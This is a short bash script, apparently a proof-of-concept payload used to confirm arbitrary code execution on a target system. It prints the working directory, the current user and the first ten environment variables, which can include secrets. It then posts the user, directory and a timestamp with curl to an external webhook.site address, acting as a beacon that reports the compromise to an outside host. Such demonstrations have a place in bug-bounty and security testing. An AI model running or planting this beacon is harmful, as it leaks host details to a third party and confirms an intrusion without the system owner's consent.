#!/bin/bash
echo "🚨 ARBITRARY CODE EXECUTION CONFIRMED"
echo "Current directory: $(pwd)"
echo "User: $(whoami)"
echo "Environment variables:"
env | head -10

# Send confirmation to webhook
curl -X POST https://webhook.site/bac867bd-57d4-4979-b726-87bc944a43d7 \
  -d "executed=true&user=$(whoami)&pwd=$(pwd)&timestamp=$(date)" || true
